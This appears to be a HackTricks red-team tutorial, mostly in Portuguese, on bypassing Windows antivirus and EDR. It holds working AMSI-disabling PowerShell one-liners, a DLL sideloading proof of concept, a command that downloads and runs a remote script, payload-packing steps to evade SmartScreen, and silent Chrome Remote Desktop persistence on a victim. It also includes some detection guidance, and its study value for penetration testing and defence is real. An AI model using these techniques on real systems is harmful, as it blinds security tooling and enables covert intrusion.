# Antivírus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o Windows Defender fingindo outro AV.
- [Desativar o Defender se você for administrador](basic-powershell-for-pentesters/README.md)

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é feita sinalizando strings conhecidas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo: descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode te comprometer mais facilmente, pois elas provavelmente já foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você vai precisar de algum tipo de loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo o que você precisa fazer é mudar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não existirão assinaturas conhecidas como maliciosas, mas isso leva muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e então solicita que o Defender escaneie cada um individualmente; dessa forma, ele pode te dizer exatamente quais strings ou bytes foram sinalizados no seu binário.

Recomendo fortemente que veja esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion na prática.

### **Análise dinâmica**

A análise dinâmica é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do navegador, realizar um minidump no LSASS, etc.). Esta parte pode ser um pouco mais complicada de trabalhar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como está implementado, pode ser uma ótima forma de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar sleeps longos pode atrapalhar a análise dos binários. O problema é que muitos sandboxes dos AVs podem simplesmente pular o sleep dependendo de como está implementado.
- **Checking machine's resources** Normalmente Sandboxes têm muito poucos recursos para trabalhar (por exemplo, < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser bastante criativo aqui, por exemplo verificando a temperatura da CPU ou até as rotações das ventoinhas; nem tudo estará implementado no sandbox.
- **Machine-specific checks** Se você quer direcionar um usuário cujo workstation está ingressado no domínio "contoso.local", você pode checar o domínio do computador para ver se bate com o especificado; se não bater, seu programa pode simplesmente sair.

Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da detonação; se o nome bater com HAL9TH, significa que você está dentro do sandbox do Defender, então pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas muito boas do [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como dissemos antes neste post, ferramentas públicas eventualmente serão detectadas, então você deve se perguntar algo:

Por exemplo, se você quer dumpar o LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também faz dump do LSASS?

A resposta certa provavelmente é a última. Pegando o mimikatz como exemplo, ele provavelmente é um dos, se não o mais, detectado por AVs e EDRs; embora o projeto em si seja muito legal, é também um pesadelo trabalhar com ele para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, seriamente, **DO NOT UPLOAD TO VIRUSTOTAL** se seu objetivo é atingir evasão a longo prazo. Se você quer checar se seu payload é detectado por um AV em particular, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**, na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque bem simples para evitar detecção em alguns casos (se o seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um payload DLL do Havoc tem taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem taxa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me de um payload Havoc EXE normal vs um payload Havoc DLL normal</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de busca de DLLs usada pelo loader ao posicionar tanto a aplicação vítima quanto o(s) payload(s) malicioso(s) lado a lado.

Você pode checar por programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
This command will output the list of programs susceptible to DLL hijacking inside "C:\Program Files\\" and the DLL files they try to load.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**; esta técnica é bastante discreta quando feita corretamente, mas se você usar programas publicamente conhecidos como DLL Sideloadable, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não será suficiente para executar seu payload, já que o programa espera funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (maliciosa) para a DLL original, preservando a funcionalidade do programa e permitindo executar seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) do [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que são na verdade "forwarders": ao invés de apontar para código, a entrada de export contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um caller resolve a exportação, o Windows loader irá:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Comportamentos-chave para entender:
- Se `TargetDll` é um KnownDLL, ele é fornecido a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).
- Se `TargetDll` não é um KnownDLL, a ordem normal de busca de DLLs é usada, o que inclui o diretório do módulo que está fazendo a resolução do forward.

Isso habilita uma primitiva indireta de sideloading: encontre uma DLL assinada que exporte uma função encaminhada para um nome de módulo que não seja KnownDLL, então coloque essa DLL assinada no mesmo diretório de uma DLL controlada pelo atacante com exatamente o mesmo nome do módulo alvo encaminhado. Quando a export encaminhada for invocada, o loader resolve o forward e carrega sua DLL a partir do mesmo diretório, executando seu DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é um KnownDLL, então é resolvido pela ordem normal de busca.

PoC (copy-paste):
1) Copie a DLL de sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acionar o forward com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- `rundll32` (assinado) carrega o side-by-side `keyiso.dll` (assinado)
- Ao resolver `KeyIsoSetAuditingInterface`, o carregador segue o encaminhamento para `NCRYPTPROV.SetAuditingInterface`
- Em seguida o carregador carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementado, você receberá um erro "missing API" somente depois que `DllMain` já tiver sido executado

Hunting tips:
- Concentre-se em forwarded exports cujo módulo de destino não é um KnownDLL. KnownDLLs são listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
Consulte o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideias de detecção/defesa:
- Monitore LOLBins (ex.: rundll32.exe) carregando DLLs assinadas de caminhos que não são do sistema, seguidas pelo carregamento de non-KnownDLLs com o mesmo nome base nesse diretório
- Dispare alertas para cadeias de processo/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Aplique políticas de integridade de código (WDAC/AppLocker) e negue write+execute em diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasão é um jogo de gato e rato — o que funciona hoje pode ser detectado amanhã, então nunca dependa de apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasão.

## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **arquivos em disco**, então se você conseguisse executar payloads **diretamente em memória**, o AV não podia fazer nada para impedir, pois não tinha visibilidade suficiente.

A funcionalidade AMSI está integrada nesses componentes do Windows.

- User Account Control, or UAC (elevação de EXE, COM, MSI, ou instalação ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ela permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo do script de forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` gerará o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Note como ele antepõe `amsi:` e então o caminho para o executável de onde o script foi executado — neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas mesmo assim fomos detectados em memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também passa pelo AMSI. Isso afeta até `Assembly.Load(byte[])` para carregamento em memória. Por isso, usar versões mais antigas do .NET (como 4.7.2 ou inferiores) é recomendado para execução em memória se você quiser evadir o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI trabalha principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham várias camadas, então a obfuscação pode ser uma má opção dependendo de como é feita. Isso torna a evasão não tão trivial. Embora, às vezes, tudo que você precise seja mudar alguns nomes de variáveis e pronto, então depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente mesmo executando como um usuário não privilegiado. Devido a essa falha na implementação do AMSI, pesquisadores descobriram múltiplas formas de evadir a varredura do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhuma varredura seja iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi preciso foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então é necessária alguma modificação para usar essa técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Essa técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código E_INVALIDARG; dessa forma, o resultado da verificação real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Existem também muitas outras técnicas usadas para bypass AMSI com powershell, confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

Esta ferramenta [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) também gera script para bypass AMSI.

**Remove the detected signature**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da assinatura AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**AV/EDR products that uses AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use a versão 2 do Powershell**
Se você usar PowerShell version 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para attackers que querem evadir a detecção**.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Use Powershell version 2**: Se você usar PowerShell version 2, AMSI não será carregado, então você pode rodar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnar um powershell without defenses (isso é o que `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Várias técnicas de obfuscation dependem de criptografar dados, o que aumentará a entropia do binário e tornará mais fácil para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique criptografia apenas em seções específicas do seu código que sejam sensíveis ou precisem ser escondidas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário gerado no dnSpy, procure por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *payload* real. Frequentemente o malware o armazena como um array de bytes codificado em TLV inicializado dentro de `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação [LLVM](http://www.llvm.org/) capaz de proporcionar maior segurança de software através de code obfuscation e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, obfuscated code sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de obfuscated operations geradas pelo framework C++ template metaprogramming que tornará a vida de quem quiser crackar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um obfuscator binário x64 capaz de obfuscar vários arquivos PE diferentes incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de metamorphic code para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um fine-grained code obfuscation framework para linguagens suportadas pelo LLVM que usa ROP (return-oriented programming). ROPfuscator obfusca um programa ao nível de código assembly transformando instruções regulares em ROP chains, contrariando nossa concepção natural de fluxo de controle.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando More Info -> Run anyway).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é automaticamente criado ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o Zone.Identifier ADS para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **confiável** **não acionam o SmartScreen**.

Uma forma muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de container, como um ISO. Isso acontece porque Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evitar o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registem eventos**. No entanto, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Similar to how AMSI is disabled (bypassed) it's also possible to make the **`EtwEventWrite`** function of the user space process return immediately without logging any events. Isto é feito patchando a função na memória para retornar imediatamente, desabilitando efetivamente o logging do ETW para esse processo.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

Envolve **spawnar um novo processo sacrificial**, injetar seu código pós-exploração malicioso nesse novo processo, executar o código malicioso e, ao terminar, matar o novo processo. Isto tem benefícios e desvantagens. O benefício do método fork and run é que a execução ocorre **fora** do nosso processo implantado Beacon. Isso significa que se algo na nossa ação pós-exploração der errado ou for detectado, há uma **chance muito maior** de o nosso **implant sobreviver.** A desvantagem é que você tem uma **maior chance** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Trata-se de injetar o código pós-exploração malicioso **no próprio processo**. Assim, você evita criar um novo processo e submetê-lo a scans de AV, mas a desvantagem é que se algo der errado na execução do payload, há uma **chance muito maior** de **perder seu beacon**, pois ele pode travar.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

Ao permitir acesso aos Interpreter Binaries e ao ambiente na share SMB, você pode **executar código arbitrário nessas linguagens dentro da memória** da máquina comprometida.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping é uma técnica que permite a um atacante **manipular o token de acesso ou um produto de segurança como um EDR ou AV**, permitindo reduzir suas permissões de modo que o processo não morra, mas também não tenha permissões para checar atividades maliciosas.

Para prevenir isso, o Windows poderia **impedir que processos externos** obtenham handles sobre os tokens de processos de segurança.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).


## Advanced Evasion

Evasion é um tópico muito complexo; às vezes você precisa levar em conta muitas fontes diferentes de telemetria em um único sistema, então é praticamente impossível ficar completamente indetectável em ambientes maduros.

Cada ambiente que você atacar terá suas próprias forças e fraquezas.

Eu fortemente encorajo você a assistir esta palestra de [@ATTL4S](https://twitter.com/DaniLJ94), para obter uma introdução a técnicas mais avançadas de Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

This is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

